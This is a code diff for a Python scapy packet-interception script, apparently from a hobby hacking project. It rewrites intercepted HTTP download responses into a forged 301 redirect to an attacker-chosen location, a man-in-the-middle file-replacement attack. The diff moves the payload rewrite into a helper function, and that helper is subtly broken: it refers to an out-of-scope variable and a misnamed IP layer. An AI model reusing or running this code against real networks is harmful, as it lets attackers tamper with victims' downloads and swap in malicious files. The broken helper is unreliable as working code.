@@ -7,6 +7,15 @@ import scapy.all as scapy
 
 ack_list=[]  
 
+def set_load(packet,load):
+
+    packet[scapy.Raw].load=load
+    del scapy_packet[scapy.Ip].len
+    del scapy_packet[scapy.Ip].chksum
+    
+    return packet
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())   #converting into scapy packet
     if scapy_packet.haslayer(scapy.Raw):   #checking for HTTP layer
@@ -22,11 +31,9 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+]Replacing File")
-               scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation:<where you want to redirect>\n\n"   #changing status code to 301 to redirect the responses.
-               del scapy_packet[scapy.Ip].len
-               del scapy_packet[scapy.Ip].chksum
-               packet.set_payload(str(scapy_packet))
-
+               modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation:<where you want to redirect>\n\n")   #changing status code to 301 to redirect the responses.
+               
+               packet.set_payload(str(modified_packet))
 
     packet.accept()  #to forward the packets
 
